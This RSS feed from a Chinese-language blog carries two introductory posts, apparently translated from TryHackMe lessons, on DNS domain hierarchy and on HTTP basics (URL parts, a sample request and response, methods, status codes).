<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 夜路归</title>
        <link>https://Yerucrem.github.io/post/</link>
        <description>Recent content in Posts on 夜路归</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Yerucrem</copyright>
        <lastBuildDate>Wed, 19 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>DNS 详细信息</title>
        <link>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/54afbc538832e9159efdc2ac951b4fabecad8304bd717a9aece08e26440c0690.png" alt="Featured image of post DNS 详细信息" /&gt;&lt;h1 id=&#34;dns详细信息&#34;&gt;DNS详细信息
&lt;/h1&gt;&lt;p&gt;DNS（域名系统）为我们提供了一种与 Internet 上的设备进行通信的简单方法，而无需记住复数。就像每栋房子都有一个直接向其发送邮件的唯一地址一样，互联网上的每台计算机都有自己唯一的地址来与之通信，称为 IP 地址。IP 地址类似于以下 104.26.10.229,4 组数字，范围从 0 到 255，用句点分隔。当您想访问一个网站时，记住这组复杂的数字并不十分方便，而这正是 DNS 可以提供帮助的地方。因此，您可以记住 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt;，而不是记住 104.26.10.229。&lt;/p&gt;
&lt;h2 id=&#34;域层次结构&#34;&gt;域层次结构
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319084618758.png&#34;
	width=&#34;741&#34;
	height=&#34;512&#34;
	srcset=&#34;https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319084618758_hu_1867aeeda7f9371e.png 480w, https://Yerucrem.github.io/p/dns-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319084618758_hu_3b5125054617d177.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;144&#34;
		data-flex-basis=&#34;347px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;tld-顶级域名&#34;&gt;TLD （顶级域名）
&lt;/h3&gt;&lt;p&gt;TLD 是域名最右侧的部分。因此，例如，&lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; TLD 是 &lt;strong&gt;.com&lt;/strong&gt;。TLD 有两种类型，gTLD（通用顶级域名）和 ccTLD（国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途;例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理目的，例如 .ca 表示位于加拿大的站点，.co.uk 表示位于英国的站点，依此类推。由于这种需求，涌入了从 .online 、 .club 、 .website 、 .biz 等 新 gTLD 。&lt;/p&gt;
&lt;h3 id=&#34;二级域&#34;&gt;二级域
&lt;/h3&gt;&lt;p&gt;以 &lt;a class=&#34;link&#34; href=&#34;http://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com&lt;/a&gt; 为例，.com部分是 TLD，tryhackme 是二级域名。注册域名时，二级域名限制为 63 个字符 + TLD，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾或有连续的连字符）。&lt;/p&gt;
&lt;h3 id=&#34;子域&#34;&gt;子域
&lt;/h3&gt;&lt;p&gt;子域位于二级域的左侧，使用句点分隔它;例如，在 name &lt;a class=&#34;link&#34; href=&#34;http://admin.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;admin.tryhackme.com&lt;/a&gt; 中，admin 部分是 subdomain。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 a-z 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用多个子域（用句点拆分）来创建更长的名称，例如 &lt;a class=&#34;link&#34; href=&#34;http://jupiter.servers.tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jupiter.servers.tryhackme.com&lt;/a&gt;。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HTTP 详细信息</title>
        <link>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/8869B409E00211CCAA40D8BA9BC4F9A4.jpg" alt="Featured image of post HTTP 详细信息" /&gt;&lt;h1 id=&#34;http协议&#34;&gt;HTTP协议
&lt;/h1&gt;&lt;h2 id=&#34;什么是-http超文本传输协议&#34;&gt;什么是 HTTP？（超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTP 是您查看网站时使用的工具，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则集。&lt;/p&gt;
&lt;h2 id=&#34;什么是-https-安全超文本传输协议&#34;&gt;什么是 HTTPS？ （安全超文本传输协议）
&lt;/h2&gt;&lt;p&gt;HTTPS 是 HTTP 的安全版本。 HTTPS 数据是加密的，因此它不仅可以阻止人们看到您接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是冒充它。&lt;/p&gt;
&lt;h2 id=&#34;什么是-url统一资源定位器&#34;&gt;什么是 URL？（统一资源定位器）
&lt;/h2&gt;&lt;p&gt;如果您曾经使用过 Internet，那么您以前也使用过 URL。URL 主要是有关如何访问 Internet 上的资源的指令。下图显示了 URL 及其所有功能的外观（它不会在每个请求中使用所有功能）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090006894.png&#34;
	width=&#34;727&#34;
	height=&#34;190&#34;
	srcset=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090006894_hu_341912367bc8a648.png 480w, https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090006894_hu_6b1d84a3f82592a9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;382&#34;
		data-flex-basis=&#34;918px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Scheme&lt;/strong&gt;:这指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。&lt;/li&gt;
&lt;li&gt;**User:**某些服务需要身份验证才能登录，您可以在 URL 中输入用户名和密码才能登录。&lt;/li&gt;
&lt;li&gt;**Host:**您要访问的服务器的域名或 IP 地址。&lt;/li&gt;
&lt;li&gt;**Port:**您要连接的端口，通常为 80 用于 HTTP，443 用于 HTTPS，但这可以托管在 1 - 65535 之间的任何端口上。&lt;/li&gt;
&lt;li&gt;**Path:**您尝试访问的资源的文件名或位置。&lt;/li&gt;
&lt;li&gt;**Query String:**可以发送到请求路径的额外信息位。例如，/blog？&lt;strong&gt;id=1&lt;/strong&gt; 将告知博客路径您希望接收 ID 为 1 的博客文章。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fragment:&lt;/strong&gt; 这是对请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面即可查看该页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;提出请求&#34;&gt;提出请求
&lt;/h2&gt;&lt;p&gt;只需一行 &lt;strong&gt;GET / HTTP/1.1&lt;/strong&gt; 就可以向 Web 服务器发出请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090147014.png&#34;
	width=&#34;366&#34;
	height=&#34;270&#34;
	srcset=&#34;https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090147014_hu_6fdf22078ac11d1d.png 480w, https://Yerucrem.github.io/p/http-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF/image-20250319090147014_hu_138b68ee70ca6bb4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;135&#34;
		data-flex-basis=&#34;325px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;但要获得更丰富的 Web 体验，您还需要发送其他数据。这些其他数据以所谓的 headers 形式发送，其中 header 包含额外的信息，以提供给您正在与之通信的 Web 服务器，但我们将在 Header 任务中对此进行更多介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请求示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  GET / HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: tryhackme.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 Firefox/87.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: https://tryhackme.com/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; 此请求将发送 GET 方法（ 在 HTTP 方法 任务中，有更多相关信息），请求带有 / 的主页，并告知 Web 服务器我们使用的是 HTTP 协议版本 1.1。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 我们告诉 Web 服务器我们希望网站 tryhackme.com&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; 我们告诉 Web 服务器我们使用的是 Firefox 版本 87 浏览器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; 我们告诉 Web 服务器，将我们引荐到此网页的网页是 &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;**第 5 行：**HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;响应示例：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  HTTP/1.1 200 OK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: nginx/1.15.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Fri, 09 Apr 2021 13:34:03 GMT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 98
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;TryHackMe&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Welcome To TryHackMe.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第 1 行：&lt;/strong&gt; HTTP 1.1 是服务器正在使用的 HTTP 协议版本，然后是 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 2 行：&lt;/strong&gt; 这告诉我们 Web 服务器软件和版本号。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 3 行：&lt;/strong&gt; Web 服务器的当前日期、时间和时区。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 4 行：&lt;/strong&gt; Content-Type 标头告诉客户端将发送哪种信息，例如 HTML、图像、视频、pdf、XML。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 5 行：&lt;/strong&gt; Content-Length 告诉客户端响应多长时间，这样我们就可以确认没有丢失数据&lt;/p&gt;
&lt;p&gt;**第 6 行：**HTTP 响应包含一个空行，用于确认 HTTP 响应的结束。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第 7-14 行：&lt;/strong&gt; 已请求的信息，在本例中为主页。&lt;/p&gt;
&lt;h2 id=&#34;http方法&#34;&gt;HTTP方法
&lt;/h2&gt;&lt;h3 id=&#34;get-request&#34;&gt;GET Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器获取信息。&lt;/p&gt;
&lt;h3 id=&#34;post-request&#34;&gt;POST Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器并可能创建新记录&lt;/p&gt;
&lt;h3 id=&#34;put-request&#34;&gt;PUT Request
&lt;/h3&gt;&lt;p&gt;这用于将数据提交到 Web 服务器以更新信息&lt;/p&gt;
&lt;h3 id=&#34;delete-request&#34;&gt;DELETE Request
&lt;/h3&gt;&lt;p&gt;这用于从 Web 服务器中删除信息/记录。&lt;/p&gt;
&lt;h2 id=&#34;http-协议状态代码&#34;&gt;HTTP 协议状态代码：
&lt;/h2&gt;&lt;p&gt;在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，告知客户端其请求的结果以及可能如何处理该请求。这些状态代码可以分为 5 个不同的范围：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;100-199 - Information Response 100-199 - 信息响应&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;发送这些请求是为了告诉客户端其请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再很常见。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;200-299 - 成功&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此状态代码范围用于告诉客户端其请求成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;300-399 - 重定向&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这些用于将客户端的请求重定向到另一个资源。这可以是不同的网页，也可以是完全不同的网站。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400-499 - Client Errors 400-499 - 客户端错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;用于通知客户端其请求有错误。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500-599 - 服务器错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这是为服务器端发生的错误保留的，通常表示处理请求的服务器存在相当大的问题。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;常见的-http-状态代码&#34;&gt;常见的 HTTP 状态代码：
&lt;/h2&gt;&lt;p&gt;有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的 HTTP 状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;200 - OK 200 - 正常&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;请求已成功完成。&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;201 - Created 201 - 已创建&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;已创建资源（例如，新用户或新博客文章）。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;301 - Moved Permanently 301 - 永久移动&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会将客户的浏览器重定向到新网页，或告诉搜索引擎该页面已移至其他位置并改为查看那里。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;302 - Found 302 - 找到&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;与上述永久重定向类似，但顾名思义，这只是一个临时更改，在不久的将来可能会再次更改。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;400 - Bad Request 400 - 错误请求&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;这会告诉浏览器他们的请求中有错误或缺失。如果请求的 Web 服务器资源需要客户端未发送的特定参数，则有时可以使用此方法。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;401 - Not Authorised 401 - 未授权&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在您授权 Web 应用程序（通常是使用用户名和密码）之前，您当前不允许查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;403 - Forbidden 403 - 禁止&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;无论您是否登录，您都无权查看此资源。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;405 - Method Not Allowed 405 - 不允许使用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;资源不允许此方法请求，例如，当资源需要 POST 请求时，您向资源 /create-account 发送 GET 请求。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;404 - Page Not Found 404 - 未找到页面&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;您请求的页面/资源不存在。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;500 - Internal Service Error 500 - 内部服务错误&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;服务器在您的请求中遇到了某种错误，它不知道如何正确处理。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;503 - Service Unavailable 503 - 服务不可用&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;此服务器无法处理您的请求，因为它已过载或停机进行维护。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;headers-头&#34;&gt;Headers 头
&lt;/h2&gt;&lt;p&gt;标头是您在发出请求时可以发送到 Web 服务器的附加数据位。&lt;/p&gt;
